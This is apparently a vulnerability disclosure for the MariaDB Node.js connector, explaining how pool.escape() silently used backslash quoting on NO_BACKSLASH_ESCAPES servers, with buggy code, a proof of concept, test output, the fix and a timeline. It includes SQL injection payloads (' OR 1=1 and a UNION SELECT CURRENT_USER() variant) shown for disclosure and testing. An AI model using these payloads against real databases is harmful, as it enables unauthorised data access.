---
title: "MariaDB Connector/Node.js: escape() guessed the session mode"
date: 2026-11-06
target: "mariadb-corporation/mariadb-connector-nodejs"
severity: High
identifier: "CONJS-378"
advisory_url: "https://github.com/mariadb-corporation/mariadb-connector-nodejs/blob/main/CHANGELOG.md"
summary: "pool.escape() read the escaping mode from an idle connection only. With no idle connection it silently fell back to backslash quoting, which is not an escape on a NO_BACKSLASH_ESCAPES server, so a quoted value could still close the string. Fixed in 3.5.5 and the 3.2 to 3.4 maintenance lines."
---

## Summary

`pool.escape(value)` is documented as the safe way to build a statement with a value in it: "escaping a parameter properly, according to a parameter type, to avoid injection". To escape correctly it has to know the session's mode, because `NO_BACKSLASH_ESCAPES` changes what a backslash means. It read that mode from an idle connection, and when no connection was idle, before the first connection existed or while all of them were busy, it fell back to the classic backslash tables without telling anyone.

On a server running with `NO_BACKSLASH_ESCAPES`, that fallback is not escaping. A single quote goes out as `\'`, the backslash is an ordinary character to the server, and the quote still closes the literal. The value stays injectable exactly where the API promises it is not.

This is CONJS-378, fixed in 3.5.5 and in the 3.2.6, 3.3.5 and 3.4.8 maintenance releases. The changelog credits buxuwa and Kaya Emre Arikan as reporters.

## Background

The parent issue is CONJS-368, published as GHSA-r3rv-jm3r-62q2: escaping ignored the session mode entirely, so any text parameter on a `NO_BACKSLASH_ESCAPES` server was escaped with the wrong tables. That fix made escaping mode-aware by reading `info.status` from a connection, and added the `STATUS_NO_BACKSLASH_ESCAPES` branch in the escape tables.

It solved the `Connection` case, where the connection is right there. The pool case is different: `pool.escape()` has no connection of its own, so it asks the pool for any connection's information object. That lookup is where the residual defect lived.

## The bug

Three small defects stack.

**The lookup cannot see busy connections.** `lib/pool.js`:

```js
_searchInfo() {
  let info = null;
  let conn = this.#idleConnections.get(0);

  if (!conn) {
    for (const threadId in Object.keys(this.#activeConnections)) {
      conn = this.#activeConnections[threadId];
      if (!conn) break;
    }
  }

  if (conn) info = conn.info;
  return info;
}
```

`Object.keys()` already returns an array, and `for...in` over an array walks the indices `"0"`, `"1"`. `#activeConnections` is keyed by the server thread id, `"42"` and friends, so `#activeConnections["0"]` is `undefined` and the loop exits on the first iteration. The active-connection branch never runs.

**A null information object means backslash mode.** `lib/misc/utils.js`:

```js
const noBackslashEscapes = info != null && (info.status & ServerStatus.STATUS_NO_BACKSLASH_ESCAPES) !== 0;
const escapeRegexp = noBackslashEscapes ? QUOTE_GLOBAL_REGEXP : CHARS_GLOBAL_REGEXP;
const escapeMap = noBackslashEscapes ? QUOTE_ESCAPE : LITTERAL_ESCAPE;
```

With `info == null` the condition is false and the backslash tables win by default. The comment above it says the case is expected, which is what turned a missing check into a silent wrong answer.

**Nothing fails closed.** The pool knows it has no session to ask, and still returns a string that looks escaped.

Probing the released 3.5.4 bundle with a debug hook shows the three states directly: `[cold] NULL`, `[warm] SET`, `[busy] NULL`.

## Proof of concept

```js
const mariadb = require('mariadb');
const pool = mariadb.createPool({ host: '127.0.0.1', port: 3307, user: 'root',
  password: '...', connectionLimit: 2 });

// server started with --sql-mode=NO_BACKSLASH_ESCAPES
const evil = "' OR 1=1 -- ";
console.log(pool.escape(evil));
// 3.5.4, cold or all-busy: '\\' OR 1=1 -- '   the quote closes the literal
// 3.5.4, warm:            ''' OR 1=1 -- '     correctly doubled

const rows = await pool.query('SELECT id, name FROM lab.t2 WHERE name = ' + pool.escape(evil));
// vulnerable: both rows come back
// fixed:      0 rows
```

The same shape with `' UNION SELECT 999, CURRENT_USER() -- ` returned the server's user name on the vulnerable build.

## Observed behaviour

Harness: two `mariadb:11` containers on the same machine, one started with `--sql-mode=NO_BACKSLASH_ESCAPES` (port 3307) and one with the default mode as a control (port 3308). The client is the npm package, installed fresh per version.

On `mariadb@3.5.4`, before the fix:

```
[busy] escape(evil)      = "'\\' OR 1=1 -- '"
[busy] backslash-in-output: true
[E2E busy]  rows: 2 [{"id":1,"name":"alice"},{"id":2,"name":"bob"}]
```

On `mariadb@3.5.5`, the published fix, the same script today:

```
[cold] escape(evil)      = THROW code=ER_ESCAPE_NO_CONNECTION errno=45066
[warm] escape(evil)      = "''' OR 1=1 -- '"
[busy] escape(evil)      = "''' OR 1=1 -- '"
[busy] backslash-in-output: false false
[E2E busy]  rows: 0 []
[E2E warm]  rows: 0 []
```

The control server behaves as it should in both versions: backslash escaping there is correct, because backslash is an escape character in the default mode.

The types that do not depend on the session mode, numbers and booleans and null, are unchanged across the fix, which is the sanity check that the repair did not disturb the ordinary path.

## Impact

Any application that builds SQL with `pool.escape()` and runs against a `NO_BACKSLASH_ESCAPES` server can be injected when the pool is cold or saturated. That is not an exotic configuration: the mode is set per session by some proxies and connection poolers, and it is common in migrations from other databases.

The precondition is what holds the score at 8.1 and not higher. `AC:H` covers the deployment mode and the timing, since a warm pool takes the correct path. But timing is attacker-influenced in a busy service: a burst of parallel requests that fills the pool is enough to push the next `escape()` onto the fallback, and the attacker does not need to know which request wins.

The HackerOne report was triaged as a duplicate of the earlier CONJS-378 report and scored 6.3 by the platform. My own recomputation with the vendor's sibling vector gives 8.1. Both descriptions are of the same defect; treat the number as a range, not a fact about the bug.

## Fix

3.5.5 repairs both halves. `_searchInfo()` now iterates `Object.values(this.#activeConnections)`, so a busy pool returns the information object it always should have. `escape()` throws `ER_ESCAPE_NO_CONNECTION` (errno 45066) when no information object exists at all, rather than guessing the mode. A regression test, `pool-escape-no-backslash.test.js`, covers the busy and cold states.

If you are pinned below 3.5.5, the workaround is to escape on a connection rather than the pool, `connection.escape()`, which always has the session in hand, or to set the mode explicitly and keep at least one idle connection. Neither is as good as the upgrade, because the pool path is the one the documentation recommends.

## Timeline

- **2026-10-09**: reported to the MariaDB HackerOne program as #4099722, with a runnable pool harness and both servers.
- **2026-10-11**: triaged duplicate of CONJS-378, which had been reported earlier by buxuwa. Record only, no rebuttal: the defect is the same one.
- **2026-10-16**: Diego Dupin confirmed the fix was merged on `develop` and the maintenance branches, unreleased, and promised reporter credit at release.
- **2026-10-21**: tags 3.5.5, 3.4.8, 3.3.5 and 3.2.6 pushed, staged on npm, not installable yet.
- **2026-10-22**: the changelog on `main` corrected to "report by buxuwa and Kaya Emre Arikan". The immutable tag still carries the earlier line.
- **2026-11-05**: 3.5.5 and the maintenance releases published on npm.
- **2026-11-06**: fix re-verified on the published artifact, cold throws 45066, warm and busy double the quotes, zero rows end to end.
